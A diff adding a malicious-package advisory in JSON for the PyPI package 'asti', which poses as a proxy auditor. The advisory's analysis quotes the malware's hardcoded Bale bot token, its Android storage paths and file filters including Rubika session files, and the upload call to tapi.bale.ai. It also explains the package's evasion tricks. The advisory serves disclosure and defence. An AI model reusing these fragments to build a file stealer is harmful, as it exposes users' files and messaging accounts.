@@ -1,0 +1,76 @@
+{
+  "schema_version": "1.7.4",
+  "published": "2026-09-09T02:53:01Z",
+  "modified": "2026-09-09T02:53:01Z",
+  "summary": "Fake proxy-auditor harvesting Android storage and Rubika session files, exfiltrated to a Bale bot channel",
+  "details": "asti ships a two-line Persian README (لایبرری ساده - \"simple library\") documenting nothing but pip install asti, and places all of its code in asti/starts.py, of which roughly 40 of 723 lines are functional. ProxyManager.__init__ hardcodes self.token = \"1263262891:neVZzZ8aKyH25k8BADzDkkurSehW3NuWgrg\", self.channel = \"5263487757\", self.filters = ['.py', '.pyrubi', '.json', '.txt', '.html', '.php'] and self.source = \"/storage/emulated/0/\" - the Android shared-storage root, which scopes the package to Python-on-Android users (Termux, Pydroid).\n\nload_proxies() recursively walks that root with o.walk(self.source) and buckets every matching path by extension into self.buffer[ext]. check_proxy() then archives each bucket to /storage/emulated/0/proxy_<ext>.zip via z.ZipFile(self.temp, 'w', z.ZIP_DEFLATED), uploads it with r.post(f\"https://tapi.bale.ai/{self.token}/sendDocument\", files={'document': payload}, data={'chat_id': self.channel}), prints \".{ext} -- ALL PROXIES ARE LIVE!\" when the upload returns HTTP 200, and deletes the archive in a finally block so no artifact persists.\n\nThe.pyrubi filter is the targeting tell: pyrubi is the Python client library for the Iranian messaging platform Rubika, and.pyrubi files are its session/authentication files, so a successful run hands the operator the victim's Rubika accounts along with all Python source, JSON configs, notes and web files on the device; exfiltration terminates at Bale (bale.ai), another Iranian messenger whose Bot API is Telegram-API-compatible.\n\nEvery identifier is deliberate misdirection - self.source is the victim's storage root, proxy_list holds their files, active/dead record upload success or failure, and check_proxy() is the exfiltration - while starts() narrates twelve emoji-labelled \"phases\" of a fake proxy audit. The remaining ~680 lines are padding: the NetworkUtils, SecurityUtils and ProxyValidator base classes consist almost entirely of methods that return random.randint(...) as fabricated latency, bandwidth, jitter, geolocation, DNS and speed-test results, and imports are single-letter aliased (import os as o, import zipfile as z, import requests as r) to defeat signature matching on os.walk and requests.post.\n\nThe sendDocument call is the only network operation in the package; the four proxy-service URLs at lines 172-175 (api.proxyscrape.com, proxy-list.download, raw.githubusercontent.com/proxy-list/main/, api.proxy-ip.net) sit in a list that is iterated for print output only and are never fetched, making them cover story rather than indicators. There is no setup.py and no module-level executable statement, so import asti alone is inert; starts() is the package's sole export (__init__.py is from.starts import starts, __all__ = [\"starts\"]) and calling it - the only usage the package supports - performs the full harvest and upload.",
+  "affected": [
+    {
+      "package": {
+        "name": "asti",
+        "ecosystem": "PyPI"
+      },
+      "versions": [
+        "0.1.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "indicators": {
+          "package_integrity": [
+            {
+              "filename": "asti-0.1.0-py3-none-any.whl",
+              "hashes": {
+                "blake2b_256": "843c6fc92408b81585b28b892c42824d97d0d1c5d1d9d869c570a9488eb5235d",
+                "md5": "8ff73988ae03929a4026ebb1e14276cd",
+                "sha256": "0e08165e52906ad008d536eda1c1d85ca39d96a75b455de553318bbf7b827135"
+              }
+            },
+            {
+              "filename": "asti-0.1.0.tar.gz",
+              "hashes": {
+                "blake2b_256": "486ee3967fc8054616cc955e7ff10ccebbd7bee83425d3649556d697aad1d1e1",
+                "md5": "ecf5ee56590bc9d493c623fde320e079",
+                "sha256": "18a3c8b4e29b3a8a76ca94f5ecdbc6f1f93234e7776a44dbfd18222eca22ef41"
+              }
+            }
+          ]
+        }
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://pypi.org/project/asti/0.1.0/"
+    }
+  ],
+  "database_specific": {
+    "malicious-packages-origins": [
+      {
+        "id": "IN-MAL-2026-019835",
+        "import_time": "2026-09-09T03:21:58.833713929Z",
+        "modified_time": "2026-09-09T02:53:01Z",
+        "sha256": "bba54b9524d7bd6b7563b91d2e19c3df6bf90887c1dd8867650f10bf1b516190",
+        "source": "amazon-inspector",
+        "versions": [
+          "0.1.0"
+        ]
+      }
+    ]
+  },
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "contact": [
+        "inspector-research@amazon.com"
+      ],
+      "type": "FINDER"
+    }
+  ]
+}
